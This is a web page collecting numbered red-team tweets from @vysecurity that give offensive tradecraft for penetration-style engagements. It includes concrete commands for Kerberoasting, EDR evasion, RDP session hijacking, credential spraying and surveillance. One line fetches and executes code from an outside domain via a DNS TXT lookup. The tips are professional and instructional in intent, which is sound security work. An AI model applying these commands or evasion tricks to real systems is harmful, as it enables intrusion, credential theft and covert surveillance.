<h2>Red Team Tips by @vysecurity on Twitter</h2>
<hr>
<ul>
<li>Red Tip #1: Profile your victim and use their user agent to mask your traffic. Alternatively use UA from software such as Outlook.</li>
<li>Red tip #2: If the enemy SOC is using proxy logs for analysis. Guess what? It wont log cookies or POST body content as can be sensitive.</li>
<li>Red tip #3: Taking a snapshot of AD can let you browse, explore and formulate future attacks if access is lost momentarily.</li>
<li>Red tip #4: consider using Office Template macros and replacing normal.dot  for persistence in VDI environments.</li>
<li>Red tip #5: Do a DNS lookup for terms such as intranet, sharepoint, wiki, nessus, cyberark and many others to start intel on your target.</li>
<li>Red tip #6: Got access but need to find target? Use WMIC to query and dump the DNS Zone for a better view of assets - <a style="color: white;" href="https://serverfault.com/questions/550385/export-all-hosts-from-dns-manager-using-powershell">Export All Hosts From DNS Manager Using Powershell</a></li>
<li>Red tip #7: Whether PSEXEC, WMI, PS remoting or even the recent COM execution technique for lateral movement. Dont forget beloved RDP.</li>
<li>Red tip #8: Make sure theres trackers in your: emails, delivery server and payload execution. Any more? Comment to share!</li>
<li>Red tip #9: When PowerUp yields no results, dont forget SysInternalss AutoRuns. Often you can find unexpected surprises :)</li>
<li>Red tip #10: When using BloodHound, dont forget DA equivalents such as administrators and server operators etc too. These arent mapped.</li>
<li>Red tip #11: When navigating mature environments, a good old network diagram along with AD OUs can help to shed some light into next steps.</li>
<li>Red tip #12: Kerberoast them hashes, could be a fast route to domain administrator. PowerView: Invoke-Kerberoast -Format Hashcat</li>
<li>Red tip #13: Shared local administrator account hashes are great for lateral movement. Find machines based on the same build and attack away</li>
<li>Red tip #14: Got extra credentials? Use different sets for separate egress channels so that if one account is disabled all the rest are ok.</li>
<li>Red tip #15: You dont need payloads when you can phish credentials and login to Citrix, VPN, email with no 2FA. Check the perimeter.</li>
<li>Red tip #16: @dafthack MailSniper, @domchell LyncSniper can be a useful but noisy way to obtain AD credentials into an organisation.</li>
<li>Red tip #17: @_staaldraad Ruler tool can be used to obtain code execution on a system running Outlook if you can access exchange externally</li>
<li>Red tip #18: When tools like MailSniper dont work in custom environments, you still have good old @Burp_Suite to replicate the attacks</li>
<li>Red tip #19: Need a DC? echo %LOGONSERVER%. Need a list? nltest /dclist, nslookup -q=srv _kerberos._tcp (domain suffix can autocomplete)</li>
<li>Red tip #20: So apparently not many people use SSH for redirector setup. So try out SSH c2 -R *:80:localhost:80. SSH config GatewayPorts yes</li>
<li>Red tip #21: Found open user home shares that are accessible? See if you can drop into Startup Programs for lateral movement and privesc.</li>
<li>Red tip #22: Use VNC, microphone and webcam to perform surveillance. Netstat, tasklist can provide context into what the users doing.</li>
<li>Red tip #23: Stash payloads in C:$Recycle.Bin</li>
<li>Red tip #24: Compromise the SOC and Security teams to watch their progress and track their email alerts for sophisticated threats</li>
<li>Red tip #25: Probably dont do this on a red team, but spray for Welcome1, Password1 if youre struggling to move. But move off fast.</li>
<li>Red tip #26: Split your campaigns up so that they are independent. Fire tons at once for decoys and to burn out the defence.</li>
<li>Red tip #27: Need more credentials? Search for passwords on Sharepoint, and intranet.</li>
<li>Red tip #28: Look for asset registers to understand who owns what machine, make and model. Theres usually an asset label to host name too!</li>
<li>Red tip #29: Lateral movement: printers, open webroots, good old Tomcat, what are your quick wins?</li>
<li>Red tip #30: Get AD credentials? Turn up on site and you might be able to use them to login to Corporate Wifi :)</li>
<li>Red tip #31: Hunting e-mails and network shares for penetration testing reports can often yield good results.</li>
<li>Red tip #32: List mounts: net use, look for shared folders and drop a UNC icon LNK into it. Run Inveigh or Wireshark on host to grab hashes.</li>
<li>Red tip #33: Orgs are transitioning to cloud services such as AWS, Beanstalk, O365, Google Apps. 2FA is vital - password reset to compromise.</li>
<li>Red tip #34: OpSec. Set notifications to your phone for logins or intrusion attempts in any part of your attack infrastructure.</li>
<li>Red tip #35: FireEye sandbox flagging your payloads? Try anti sandbox techniques! If not, just use HTA to get into memory as it doesnt scan</li>
<li>Red tip #36: Dont forget the good old GPP passwords in SYSVOL. There may be cached GPP on the machine. Applying the patch isnt enough</li>
<li>Red tip #37: Use GenHTA to generate HTA files that use anti-sandboxing techniques. https://github.com/vysec/GenHTA</li>
<li>Red tip #38: Having trouble getting @armitagehacker CobaltStrikes evil.hta through defenses? https://github.com/vysec/MorphHTA</li>
<li>Red tip #39: If emails get bounced, read the email! Sometimes due to malware scanners, spam etc. Or you may even get an out of office reply.</li>
<li>Red tip #40: @0x09AL suggests looking for default credentials on printers and embedded devices. Move off initial foothold using this.</li>
<li>Red tip #41: @Oddvarmoe suggests using Alternate Data Streams if you need to put a file on disk. For example https://github.com/samratashok/nishang/blob/master/Backdoors/Invoke-ADSBackdoor.ps1</li>
<li>Red tip #42: Got OS level access to a middle tier? Task list, netstat and wmic process list full | findstr /I commandline for more ideas!</li>
<li>Red tip #43: So you know where the server application files are. Download the binaries and check out configuration files for conn. strings</li>
<li>Red tip #44: Run PEiD and other packer / technology checkers to find out the language and packer used on downloaded server binaries.</li>
<li>Red tip #45: Run strings on the application binary for potentially other cleartext sensitive strings! (Unicode mode too)</li>
<li>Red tip #46: On a VDI? Check out C:\ and other disks for potentially sensitive files other users may have saved there.</li>
<li>Red tip #47: Incase EDR are looking for "net users /domain" try using "net use /dom"</li>
<li>Red tip #48: Is EDR potentially looking for "powershell -encodedcommand"? Try "powershell -ec"</li>
<li>Red tip #49: Attacking a heavy Macintosh or Linux estate? Send a Office Maldoc with OS checking logic to obtain footholds on either system</li>
<li>Red tip #50: Carbon Black checks for IEX and web req commands. Use powershell "powershell . (nslookup -q=txt calc.vincentyiu.co.uk )[-1]"</li>
<li>Red tip #51: Cant open C drive? Try \127.0.0.1\c$</li>
<li>Red tip #52: SC doesnt take credentials. Cant use runas? Try net use \targetip\ipc$ password /u:domain\username then sc to psexec</li>
<li>Red tip #53: When stick phishing for 2FA, consider using @mrgretzky Evilginx project which logs cookies. https://breakdev.org/evilginx-1-1-release/</li>
<li>Red tip #54: Hide from blue. Volume shadow copy then execute \?\GLOBALROOT\Device\HarddiskVolumeShadowColy1\malware.exe/dll then delete VSC</li>
<li>Red tip #55: SMB hash leaking using a UNC path for image in page for drive by leak can give you credentials for less mature environments.</li>
<li>Red tip #56: Target victims using email authentication such as Microsoft Account on Windows 10? Hash leak exposes full email address!</li>
<li>Red tip #57: Working in teams yields better results; and best of all Makes Offensive operations more fun and keeps the adrenaline pumping</li>
<li>Red tip #58: Discuss business targets and objectives with your clients. This process should set non technical goals such as "ATM spit money"</li>
<li>Red tip #59: Checking whether a server or host is good for egress? Likely to go down? "systeminfo | findstr /i boot"</li>

<li>Red tip #71: Hijack his Session using sc create sesshijack binpath= "cmd.exe /k tscon <ID> /dest:<SESSIONNAME>" then use putty session</li>
<li>Red tip #72: Most people understand email sec wrong. SPF does not mean not spoofable. SPF does nothing without DMARC.</li>
<li>Red tip #73: Weak DMARC on victim org domain? Spoof their own emails back into themselves! You even inherit their AD name and photo</li>
<li>Red tip #74: Got access to Microsoft OWA mailbox or O365? You can extract global catalog from contacts use @Burp_Suite and parse JSON object</li>
<li>Red tip #75: Write PHP delivery scripts that can mutate your payloads and add unique trackers per download. This tracks file being executed</li>
<li>Red tip #76: Simulating a criminal threat story with smash and grab agenda? Phish users and hot swap payload mid campaign to test formats</li>
<li>Red tip #77: RCE on a web application for less mature client? nslookup -q=srv _ldap._tcp if its domain joined Invoke-Kerberoast</li>

<li>Red tip #83: Struggling to find a working DB client? Live off the land and use your victims in an RDP session.</li>
<li>Red tip #84: Im sure everyone hates Oracle DB but no sweat, you can proxycap sqldeveloper.exe</li>
<li>Red tip #85: Check the users calendars before using persistence on their machine. They may be out of office and screw your master plans.</li>
<li>Red tip #86: Red team and attack simulation is not penetration testing. You shouldnt be really testing anything, but simply infiltrating.</li>
<li>Red tip #87: @Oddvarmoe uses .UDL files to quickly launch a MSSQL connection test to validate credentials! https://blogs.msdn.microsoft.com/farukcelik/2007/12/31/basics-first-udl-test/</li>
<li>Red tip #88: Dont forget Physical security! Whip up a PI with GSM and you can hack your way in by dropping the PI on network.</li>
<li>Red tip #89: regsvr32 SCT files are being detected as Squigglydoo. Looks for "script" case sensitive and "<registration" case insensitive.</li>
<li>Red tip #90: Cisco NGIPS is shit, when analysing traffic for havex it drops only <havexhavex> but not <havexDATABLOBhavex></li>
<li>Red tip #91: Decoys can be as simple as burning egress by port scanning 1-1024 through IDS, or spamming dodgy emails at blocks of employees</li>

<li>Red tip #93: Use Empyre to generate Macintosh and Linux payloads, modify it to contain code for Windows too! https://github.com/EmpireProject/EmPyre</li>
<li>Red tip #94: Client uses VDIs? Compromise underlying host and use Citrix Shadow Taskbar to spy on VDI sessions by selecting username</li>
<li>Red tip #95: @domchell recommends avoiding non persistent VDIs and persist on laptops. Query DC for live laptops.</li>
<li>Red tip #96: @lucasgates recommends using OLE objects containing VBS scripts instead of Macros as less suspicious. VBE will work too</li>
<li>Red tip #97: Use recent critical vulnerabilities such as CVE-2017-0199 HTA handler issue to simulate real threats. https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/</li>
